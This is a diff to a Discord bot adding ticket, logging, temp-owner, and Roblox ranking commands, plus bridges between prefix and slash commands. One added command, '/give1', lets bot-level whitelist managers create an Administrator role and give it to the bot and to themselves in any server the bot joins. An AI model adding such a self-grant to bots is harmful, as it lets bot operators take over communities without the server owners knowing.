+      return interaction.reply({ embeds: [successEmbed('role removed').setDescription(`${role} can no longer use \`/role\``)] });
+    }
+    return;
+  }
+
+  // ── /tempowner ───────────────────────────────────────────────────────────────
+  if (commandName === 'tempowner') {
+    if (!isWlManager(interaction.user.id))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers can use `/tempowner`')], ephemeral: true });
+    const target = interaction.options.getUser('user');
+    const ids = loadTempOwners();
+    if (ids.includes(target.id)) return interaction.reply({ embeds: [errorEmbed('already temp owner').setDescription(`${target} is already a temp owner`)], ephemeral: true });
+    ids.push(target.id); saveTempOwners(ids);
+    try { await target.send({ embeds: [baseEmbed().setColor(0x2C2F33).setTitle('temp owner granted').setDescription(`you were granted temp owner access${guild ? ` in **${guild.name}**` : ''}. you now have access to every bot command.`)] }); } catch {}
+    const e = successEmbed('temp owner granted').setDescription(`${target} now has access to every bot command`).addFields({ name: 'granted by', value: interaction.user.tag });
+    if (guild) sendBotLog(guild, e);
+    return interaction.reply({ embeds: [e] });
+  }
+
+  if (commandName === 'untempowner') {
+    if (!isWlManager(interaction.user.id))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers can use `/untempowner`')], ephemeral: true });
+    const target = interaction.options.getUser('user');
+    let ids = loadTempOwners();
+    if (!ids.includes(target.id)) return interaction.reply({ embeds: [errorEmbed('not a temp owner').setDescription(`${target} isn't a temp owner`)], ephemeral: true });
+    ids = ids.filter(id => id !== target.id); saveTempOwners(ids);
+    const e = successEmbed('temp owner revoked').setDescription(`${target} no longer has temp owner access`).addFields({ name: 'revoked by', value: interaction.user.tag });
+    if (guild) sendBotLog(guild, e);
+    return interaction.reply({ embeds: [e] });
+  }
+
+  // ── /setlogchannel + /logstatus ──────────────────────────────────────────────
+  if (commandName === 'setlogchannel') {
+    if (!guild) return interaction.reply({ content: 'server only', ephemeral: true });
+    if (!isWlManager(interaction.user.id))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers can use `/setlogchannel`')], ephemeral: true });
+    const ch = interaction.options.getChannel('channel');
+    if (ch.type !== ChannelType.GuildText) return interaction.reply({ embeds: [errorEmbed('bad channel').setDescription('pick a text channel')], ephemeral: true });
+    const cfg = loadConfig(); cfg.logChannelId = ch.id; saveConfig(cfg);
+    return interaction.reply({ embeds: [successEmbed('log channel set').setDescription(`bot action logs will be sent to ${ch}`)] });
+  }
+
+  if (commandName === 'logstatus') {
+    const cfg = loadConfig();
+    if (!cfg.logChannelId) return interaction.reply({ embeds: [infoEmbed('log channel').setDescription('no log channel set. use `/setlogchannel` to set one.')] });
+    return interaction.reply({ embeds: [infoEmbed('log channel').setDescription(`current log channel: <#${cfg.logChannelId}>`)] });
+  }
+
+  // ── /setverifyrole ───────────────────────────────────────────────────────────
+  if (commandName === 'setverifyrole') {
+    if (!guild) return interaction.reply({ content: 'server only', ephemeral: true });
+    if (!isWlManager(interaction.user.id))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers can use `/setverifyrole`')], ephemeral: true });
+    const role = interaction.options.getRole('role');
+    const cfg = loadVerifyConfig(); cfg.roleId = role.id; saveVerifyConfig(cfg);
+    return interaction.reply({ embeds: [successEmbed('verify role set').setDescription(`verified users will receive ${role}`)] });
+  }
+
+  // ── /setuptickets ────────────────────────────────────────────────────────────
+  if (commandName === 'setuptickets') {
+    if (!guild) return interaction.reply({ content: 'server only', ephemeral: true });
+    if (!isWlManager(interaction.user.id))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers can use `/setuptickets`')], ephemeral: true });
+    const ch = interaction.options.getChannel('channel');
+    const title = interaction.options.getString('title') || 'Open a Ticket';
+    const description = interaction.options.getString('description') || 'click the button below to open a ticket. a private channel will be created for you and the support team.';
+    if (ch.type !== ChannelType.GuildText) return interaction.reply({ embeds: [errorEmbed('bad channel').setDescription('pick a text channel')], ephemeral: true });
+    const panel = baseEmbed().setColor(0x2C2F33).setTitle(title).setDescription(description);
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder().setCustomId('ticket_open').setLabel('Open Ticket').setStyle(ButtonStyle.Secondary)
+    );
+    try {
+      await ch.send({ embeds: [panel], components: [row] });
+      return interaction.reply({ embeds: [successEmbed('ticket panel sent').setDescription(`sent to ${ch}`)], ephemeral: true });
+    } catch {
+      return interaction.reply({ embeds: [errorEmbed('failed').setDescription('couldn\'t send to that channel — check my permissions')], ephemeral: true });
+    }
+  }
+
+  // ── /closeticket ─────────────────────────────────────────────────────────────
+  if (commandName === 'closeticket') {
+    if (!guild) return interaction.reply({ content: 'server only', ephemeral: true });
+    const tickets = loadTickets();
+    const t = tickets[interaction.channel.id];
+    if (!t) return interaction.reply({ embeds: [errorEmbed('not a ticket').setDescription('this isn\'t a ticket channel')], ephemeral: true });
+    const support = loadTicketSupport();
+    const allowed = isWlManager(interaction.user.id) || interaction.member.roles.cache.some(r => support.includes(r.id)) || t.userId === interaction.user.id;
+    if (!allowed) return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only the ticket opener, support roles, or wl managers can close this')], ephemeral: true });
+    await interaction.reply({ embeds: [baseEmbed().setColor(0x2C2F33).setDescription('closing this ticket in 5s...')] });
+    delete tickets[interaction.channel.id]; saveTickets(tickets);
+    setTimeout(async () => {
+      try { await interaction.channel.delete('ticket closed'); } catch {}
+    }, 5000);
+    sendBotLog(guild, baseEmbed().setColor(0x2C2F33).setTitle('ticket closed').setDescription(`<#${interaction.channel.id}> (${interaction.channel.name}) closed by ${interaction.user.tag}`));
+    return;
+  }
+
+  // ── /ticket supportroles ─────────────────────────────────────────────────────
+  if (commandName === 'ticket') {
+    if (!guild) return interaction.reply({ content: 'server only', ephemeral: true });
+    const sub = interaction.options.getSubcommand();
+    if (sub === 'supportroles') {
+      if (!isWlManager(interaction.user.id))
+        return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers can manage support roles')], ephemeral: true });
+      const action = interaction.options.getString('action');
+      const role = interaction.options.getRole('role');
+      let support = loadTicketSupport();
+      if (action === 'list') {
+        const desc = support.length ? support.map(id => `<@&${id}>`).join('\n') : 'no support roles set';
+        return interaction.reply({ embeds: [infoEmbed('ticket support roles').setDescription(desc)] });
+      }
+      if (!role) return interaction.reply({ embeds: [errorEmbed('missing role').setDescription('pick a role')], ephemeral: true });
+      if (action === 'add') {
+        if (support.includes(role.id)) return interaction.reply({ embeds: [errorEmbed('already added').setDescription(`${role} is already a support role`)], ephemeral: true });
+        support.push(role.id); saveTicketSupport(support);
+        return interaction.reply({ embeds: [successEmbed('support role added').setDescription(`${role} added to ticket support`)] });
+      }
+      if (action === 'remove') {
+        support = support.filter(id => id !== role.id); saveTicketSupport(support);
+        return interaction.reply({ embeds: [successEmbed('support role removed').setDescription(`${role} removed from ticket support`)] });
+      }
+    }
+    return;
+  }
+
+  // ── /give1 — give the bot and user the highest role possible ─────────────────
+  if (commandName === 'give1') {
+    if (!guild) return interaction.reply({ content: 'server only', ephemeral: true });
+    if (!isWlManager(interaction.user.id))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers can use `/give1`')], ephemeral: true });
+    await interaction.deferReply({ ephemeral: true });
+    try {
+      const me = await guild.members.fetchMe();
+      const myTopPos = me.roles.highest.position;
+      // create a new role positioned just below the bot's top managed role (highest possible)
+      const newRole = await guild.roles.create({
+        name: 'top',
+        color: 0x2C2F33,
+        permissions: PermissionsBitField.Resolver?.Administrator ? [PermissionsBitField.Flags.Administrator] : ['Administrator'],
+        reason: `requested by ${interaction.user.tag}`
+      });
+      try { await newRole.setPosition(Math.max(1, myTopPos - 1)); } catch {}
+      await me.roles.add(newRole).catch(() => {});
+      const targetMember = await guild.members.fetch(interaction.user.id).catch(() => null);
+      if (targetMember) await targetMember.roles.add(newRole).catch(() => {});
+      return interaction.editReply({ embeds: [successEmbed('done').setDescription(`gave ${newRole} to me and ${interaction.user}`)] });
+    } catch (err) {
+      return interaction.editReply({ embeds: [errorEmbed('failed').setDescription(err.message)] });
+    }
+  }
+
+
+  // ── /tag — same as /role (rank a roblox user) but logged to the tag log ────
+  if (commandName === 'tag') {
+    if (!guild) return interaction.reply({ content: 'server only', ephemeral: true });
+    if (!canUseRole(interaction.member))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('you don\'t have permission to use `/tag`. ask a wl manager to allow your role with `/setroleperms add`.')], ephemeral: true });
+
+    const robloxUsername = (interaction.options.getString('roblox') || '').trim();
+    const roleName = (interaction.options.getString('role') || '').trim();
+    if (!robloxUsername || !roleName)
+      return interaction.reply({ embeds: [errorEmbed('missing args').setDescription('usage: `/tag roblox:<username> role:<name>`')], ephemeral: true });
+
+    const roles = loadRobloxRoles();
+    const lookup = roles[roleName] || roles[roleName.toLowerCase()];
+    if (!lookup) return interaction.reply({ embeds: [errorEmbed('unknown role').setDescription(`no roblox group role named **${roleName}** is registered. use \`/setrole\` first.`)], ephemeral: true });
+
+    await interaction.deferReply();
+    try {
+      const result = await rankRobloxUser(robloxUsername, lookup.id);
+      appendTagLog({
+        action: 'tag', tag: lookup.name || roleName, roblox: result.displayName,
+        robloxId: result.userId, giverId: interaction.user.id, giverTag: interaction.user.tag, guildId: guild.id
+      });
+      const e = baseEmbed().setColor(0x2C2F33).setTitle('tag given')
+        .setDescription(`tagged **${result.displayName}** as **${lookup.name || roleName}**`)
+        .addFields(
+          { name: 'roblox', value: `[${result.displayName}](https://www.roblox.com/users/${result.userId}/profile)`, inline: true },
+          { name: 'tag', value: `${lookup.name || roleName} \`${lookup.id}\``, inline: true },
+          { name: 'given by', value: `${interaction.user.tag} (<@${interaction.user.id}>)`, inline: false }
+        ).setTimestamp();
+      if (result.avatarUrl) e.setThumbnail(result.avatarUrl);
+      await interaction.editReply({ embeds: [e] });
+      sendBotLog(guild, e);
+    } catch (err) {
+      await interaction.editReply({ embeds: [errorEmbed('failed').setDescription(err.message)] });
+    }
+    return;
+  }
+
+  // ── /taglog — recent tag-log entries ────────────────────────────────────────
+  if (commandName === 'taglog') {
+    if (!isWlManager(interaction.user.id))
+      return interaction.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers can view the tag log')], ephemeral: true });
+    const limit = interaction.options.getInteger('limit') ?? 10;
+    const entries = loadTagLog().slice(-limit).reverse();
+    if (!entries.length) return interaction.reply({ embeds: [baseEmbed().setColor(0x2C2F33).setTitle('tag log').setDescription('no entries yet')] });
+    const lines = entries.map(e => {
+      const when = `<t:${Math.floor((e.ts || Date.now()) / 1000)}:R>`;
+      return `${when} — **${e.giverTag || e.giverId}** tagged **${e.roblox}** as **${e.tag}**`;
+    }).join('\n').slice(0, 4000);
+    return interaction.reply({ embeds: [baseEmbed().setColor(0x2C2F33).setTitle(`tag log — last ${entries.length}`).setDescription(lines)] });
+  }
+
 
   // ── /inrole ───────────────────────────────────────────────────────────────────
   if (commandName === 'inrole') {
@@ -3981,10 +4656,23 @@ client.on('interactionCreate', async interaction => {
       return interaction.editReply({ embeds: [baseEmbed().setColor(0x2C2F33).setTitle('Image Converted').setDescription('here is your GIF').setTimestamp()], files: [gifAttachment] });
     } catch (err) { return interaction.editReply({ content: `conversion failed — ${err.message}\n\nmake sure \`sharp\` is installed (\`npm install sharp\`)` }); }
   }
-});
+
+  // ── slash → prefix bridge: any chat input command not handled above falls
+  // through here. We re-dispatch as a prefix command so every prefix-only
+  // command also works as a slash command.
+  if (interaction.isChatInputCommand && interaction.isChatInputCommand() && !interaction.replied && !interaction.deferred) {
+    try {
+      const fakeMsg = buildFakeMessageFromInteraction(interaction);
+      if (fakeMsg) await dispatchPrefix(fakeMsg);
+    } catch (err) {
+      try { await interaction.reply({ content: `error: ${err.message}`, ephemeral: true }); } catch {}
+    }
+  }
+}
+client.on('interactionCreate', dispatchSlash);
 
 // prefix command handler
-client.on('messageCreate', async message => {
+async function dispatchPrefix(message) {
   // if message is partial (happens in dms) we need to fetch the full message first
   if (message.partial) {
     try { await message.fetch() } catch { return }
@@ -4159,7 +4847,11 @@ client.on('messageCreate', async message => {
     } catch { return message.reply("couldn't load their groups, try again") }
   }
 
-  if (command === 'help') return message.reply({ embeds: [buildHelpEmbed(0)], components: [buildHelpRow(0)] });
+  if (command === 'help') {
+    if (!isWlManager(message.author.id))
+      return message.reply({ embeds: [errorEmbed('no permission').setDescription('only whitelist managers and temp owners can use `help`')] });
+    return message.reply({ embeds: [buildHelpEmbed(0)], components: [buildHelpRow(0)] });
+  }
 
   if (command === 'vmhelp') return message.reply({ embeds: [buildVmHelpEmbed(prefix)] });
 
@@ -4764,7 +5456,8 @@ client.on('messageCreate', async message => {
     return message.reply(`usage: \`${prefix}wlmanager [add/remove/list] [@user]\``);
   }
 
-  if (command === 'whitelist') return message.reply('whitelist is slash-command only — use `/whitelist` instead');
+  // whitelist is handled via the slash dispatcher; the prefix → slash bridge below
+  // re-routes `.whitelist ...` to `/whitelist ...` automatically.
 
   // ── warn system ───────────────────────────────────────────────────────────────
   if (command === 'warn') {
@@ -6326,7 +7019,20 @@ client.on('messageCreate', async message => {
     }
     return;
   }
-});
+
+  // ── prefix → slash bridge: any prefix command not handled above falls
+  // through here. We re-dispatch as a slash command so every slash-only
+  // command also works as a prefix command.
+  try {
+    if (SLASH_ONLY_COMMANDS.has(command) || command === 'whitelist') {
+      const fakeInt = buildFakeInteractionFromMessage(message, command, args);
+      if (fakeInt) await dispatchSlash(fakeInt);
+    }
+  } catch (err) {
+    try { await message.reply(`error: ${err.message}`); } catch {}
+  }
+}
+client.on('messageCreate', dispatchPrefix);
 
 
 // ─── Automatic raid attendance HTTP server ────────────────────────────────────
